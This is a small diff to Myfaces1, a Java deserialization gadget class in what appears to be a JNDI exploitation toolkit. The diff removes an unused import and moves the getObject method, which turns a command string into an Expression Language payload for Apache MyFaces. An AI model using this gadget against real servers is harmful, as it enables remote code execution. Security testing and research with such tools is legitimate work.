@@ -1,7 +1,5 @@
 package com.qi4l.jndi.gadgets;
 
-import com.qi4l.jndi.enumtypes.PayloadType;
-
 import com.qi4l.jndi.gadgets.annotation.Authors;
 import com.qi4l.jndi.gadgets.annotation.Dependencies;
 import com.qi4l.jndi.gadgets.utils.Gadgets;
@@ -38,12 +36,7 @@ import javax.servlet.ServletResponse;
  */
 @Dependencies
 @Authors({Authors.MBECHLER})
-public class Myfaces1 implements ObjectPayload<Object>, DynamicDependencies{
-    @Override
-    public Object getObject(String command) throws Exception {
-        return makeExpressionPayload(command);
-    }
-
+public class Myfaces1 implements ObjectPayload<Object>, DynamicDependencies {
     public static String[] getDependencies() {
         if (System.getProperty("el") == null || "apache".equals(System.getProperty("el"))) {
             return new String[]{
@@ -80,5 +73,10 @@ public class Myfaces1 implements ObjectPayload<Object>, DynamicDependencies{
         ValueExpressionMethodExpression e2  = new ValueExpressionMethodExpression(ve2);
 
         return Gadgets.makeMap(e2, e);
+    }
+
+    @Override
+    public Object getObject(String command) throws Exception {
+        return makeExpressionPayload(command);
     }
 }
